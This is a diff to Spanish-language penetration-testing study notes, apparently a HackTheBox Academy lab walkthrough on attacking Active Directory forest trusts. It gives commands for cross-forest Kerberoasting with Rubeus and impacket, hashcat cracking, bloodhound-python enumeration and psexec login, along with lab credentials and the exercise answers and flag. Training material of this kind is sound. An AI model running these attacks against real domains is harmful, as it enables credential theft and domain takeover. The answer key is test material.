@@ -45,6 +45,11 @@
 	- [[#Kerberoasting entre bosques]]
 	- [[#Reutilización de la contraseña de admin y membresía de grupo]]
 	- [[#Abuso de SID History entre bosques (Cross-Forest)]]
+- [[#Atacando confianzas de dominio – Abuso de confianzas entre bosques (_Cross-Forest_) – desde Linux]]
+	- [[#Cross-Forest Kerberoasting]]
+		- [[#Usando GetUserSPNs.py]]
+		- [[#Usando la flag -request]]
+	- [[#Cazando Membresía de Grupos Foráneos con Bloodhound-python]]
 
 Antes de comenzar cualquier prueba de penetración, **realizar una fase de reconocimiento externo** puede ser muy beneficioso. Esta fase cumple varias funciones clave:
 
@@ -5241,4 +5246,165 @@ La salida del comando confirma que logramos autenticarnos en el **controlador de
 
 El atributo **SID History** puede explotarse entre bosques si **SID Filtering** no está habilitado. En una migración, un usuario del **Bosque B** podría conservar el **SID** de una cuenta con privilegios del **Bosque A**, obteniendo así **acceso administrativo** al autenticarse entre bosques. En resumen, una migración sin filtrado de SIDs puede permitir mantener privilegios del dominio original en el nuevo bosque.
 
+
+
 ![[Pasted image 20251130165959.png | 800]]
+
+##### _Perform a cross-forest Kerberoast attack and obtain the TGS for the mssqlsvc user. Crack the ticket and submit the account's cleartext password as your answer._
+
+> **Respuesta:** 1logistics
+
+Primero nos conectamos por escritorio remoto al target:
+
+```bash
+xfreerdp3 /v:10.129.29.206 /u:htb-student /p:'Academy_student_AD!'
+```
+
+Una vez dentro, usamos PowerView para enumerar cuentas dentro del dominio objetivo que tengan SPNs asociados:
+
+![[Pasted image 20251211131058.png]]
+
+Realizamos un ataque `Kerberoasting` a la confianza del dominio usando Rubeus:
+
+```powershell
+.\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap
+```
+
+![[Pasted image 20251211131238.png]]
+
+Al final del todo obtendremos el hash. Intentamos adivinarlo usando Hashcat para intentar obtener la contraseña en texto claro.
+
+```bash
+hashcat -m 13100 hash_krb.hash /usr/share/wordlists/rockyou.txt
+```
+
+Tras esperar unos segundos, la contraseña en texto claro es `1logistics`.
+
+# Atacando confianzas de dominio – Abuso de confianzas entre bosques (_Cross-Forest_) – desde Linux
+
+Como vimos en la sección anterior, a menudo es posible realizar Kerberoasting a través de un trust de bosque. Si esto es posible en el entorno que estamos evaluando, podemos llevar a cabo esta técnica con `GetUserSPNs.py` desde nuestro host de ataque Linux. Para hacer esto, necesitamos credenciales de un usuario que pueda autenticarse en el otro dominio y especificar el flag `-target-domain` en nuestro comando. Al realizar esto contra el dominio `FREIGHTLOGISTICS.LOCAL`, vemos una entrada SPN para la cuenta `mssqlsvc`.
+
+### Cross-Forest Kerberoasting
+
+##### Usando GetUserSPNs.py
+
+```bash
+$ impacket-GetUserSPNs -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley
+```
+
+> Al volver a ejecutar el comando con el flag `-request` añadido obtenemos el ticket TGS. También podríamos agregar `-outputfile <ARCHIVO_SALIDA>` para exportar directamente a un archivo que luego podríamos usar para ejecutar Hashcat contra él.
+
+##### Usando la flag -request
+
+```shell
+$ impacket-GetUserSPNs -request -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley  
+
+...SNIP...
+
+$krb5tgs$23$*mssqlsvc$FREIGHTLOGISTICS.LOCAL$FREIGHTLOGISTICS.LOCAL/mssqlsvc*$10<SNIP>
+```
+
+Podríamos intentar crackear esto offline usando Hashcat con el modo `13100`. Si tenemos éxito, podríamos autenticarnos en el dominio `FREIGHTLOGISTICS.LOCAL` como Domain Admin. En evaluaciones reales, vale la pena verificar si esta cuenta existe en nuestro dominio actual y si reutiliza contraseñas, lo cual podría ser una victoria rápida. Incluso con control del dominio actual, la reutilización de contraseñas entre cuentas similares en diferentes dominios debería incluirse como hallazgo en el informe.
+
+> Si podemos hacer Kerberoasting a través de un trust y agotamos opciones en el dominio actual, vale la pena intentar un password spray con la contraseña crackeada, ya que podría usarse para otras cuentas de servicio si los mismos administradores gestionan ambos dominios. Otro ejemplo de testing iterativo sin dejar nada sin revisar.
+
+### Cazando Membresía de Grupos Foráneos con Bloodhound-python
+
+Los `Domain Local Groups` permiten usuarios externos al bosque, por lo que es común ver usuarios privilegiados del Dominio A en grupos de administradores del Dominio B en trusts bidireccionales. Desde Linux, usamos la implementación Python de BloodHound para recolectar datos de múltiples dominios y buscar estas relaciones. Si el host de ataque no tiene DNS configurado, debemos editar `resolv.conf` añadiendo el nombre de dominio y la IP del DC como nameserver, ya que la herramienta requiere hostname DNS en lugar de IP.
+
+> Ojo porque esto es importante
+
+##### Añadiendo INLANEFREIGHT.LOCAL a `/etc/resolv.conf`
+
+```shell
+$ cat /etc/resolv.conf 
+
+# Dynamic resolv.conf(5) file for glibc resolver(3) generated by resolvconf(8)
+#     DO NOT EDIT THIS FILE BY HAND -- YOUR CHANGES WILL BE OVERWRITTEN
+# 127.0.0.53 is the systemd-resolved stub resolver.
+# run "resolvectl status" to see details about the actual nameservers.
+
+#nameserver 1.1.1.1
+#nameserver 8.8.8.8
+domain INLANEFREIGHT.LOCAL
+nameserver 172.16.5.5
+```
+
+Una vez esto esté en su sitio, podemos lanzar la herramienta contra el dominio objetivo:
+
+##### Ejecutando bloodhound-python contra INLANEFREIGHT.LOCAL
+
+```shell-session
+$ bloodhound-python -d INLANEFREIGHT.LOCAL -dc ACADEMY-EA-DC01 -c All -u forend -p Klmcargo2 --zip
+```
+
+Se genera automáticamente el archivo .zip con la información. Repetimos el proceso con el dominio `FREIGHTLOGISTICS.LOCAL`. 
+
+```shell
+$ cat /etc/resolv.conf 
+
+# Dynamic resolv.conf(5) file for glibc resolver(3) generated by resolvconf(8)
+#     DO NOT EDIT THIS FILE BY HAND -- YOUR CHANGES WILL BE OVERWRITTEN
+# 127.0.0.53 is the systemd-resolved stub resolver.
+# run "resolvectl status" to see details about the actual nameservers.
+
+#nameserver 1.1.1.1
+#nameserver 8.8.8.8
+domain FREIGHTLOGISTICS.LOCAL
+nameserver 172.16.5.238
+```
+
+```shell
+$ bloodhound-python -d FREIGHTLOGISTICS.LOCAL -dc ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -c All -u forend@inlanefreight.local -p Klmcargo2 --zip
+```
+
+Tras subir el segundo set de datos a BloodHound, en la pestaña `Analysis` seleccionamos `Users with Foreign Domain Group Membership` con dominio origen `INLANEFREIGHT.LOCAL`. Veremos que la cuenta Administrator de INLANEFREIGHT.LOCAL es miembro del grupo Administrators en FREIGHTLOGISTICS.LOCAL.
+
+![[Pasted image 20251211133806.png]]
+
+Hay varias formas de aprovechar los trusts de dominio para obtener acceso adicional y escalar privilegios. Por ejemplo, comprometer un dominio de confianza y encontrar reutilización de contraseñas en cuentas privilegiadas. Los derechos de Domain Admin en un dominio hijo casi siempre permiten comprometer el dominio padre usando el ataque ExtraSids. Este módulo proporciona las herramientas para enumerar trusts y realizar ataques estándar intra-forest y cross-forest.
+
+Para resolver las siguientes cuestiones tendremos que conectarnos por SSH al target establecido. 
+##### _Kerberoast across the forest trust from the Linux attack host. Submit the name of another account with an SPN aside from MSSQLsvc._
+
+> **Respuesta**: sapsso
+
+Hemos obtenido la contraseña del usuario `wley` previamente, que es `transporter@4`. Realizamos un ataque Kerberoasting:
+
+```bash
+impacket-GetUserSPNs -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley
+```
+
+![[Pasted image 20251211140648.png]]
+Aparece `sapsso.
+##### _Crack the TGS and submit the cleartext password as your answer._
+
+> **Respuesta**: pabloPICASSO
+
+```bash
+$impacket-GetUserSPNs -request -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley
+```
+
+Esto nos dará los hashes de ambas cuentas. Cogemos el hash de la cuenta `sapsso` y finalmente lo crackeamos con hashcat, con el módulo 13100. 
+
+```bash
+hashcat -m 13100 hash_sapsso /usr/share/wordlists/rockyou.txt
+```
+
+La contraseña es `pabloPICASSO`.
+##### _Log in to the ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL Domain Controller using the Domain Admin account password submitted for question #2 and submit the contents of the flag.txt file on the Administrator desktop._
+
+> **Respuesta**: burn1ng_d0wn_th3_f0rest!
+
+Para resolver esto tendremos que usar la herramienta `psexec`, de impacket-tools de nuevo.
+
+```bash
+impacket-psexec ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL/sapsso:pabloPICASSO@172.16.5.238
+```
+
+![[Pasted image 20251211141736.png | 800]]
+
+```
+C:\Users\Administrator\Desktop>type flag.txt
+burn1ng_d0wn_th3_f0rest!
+```
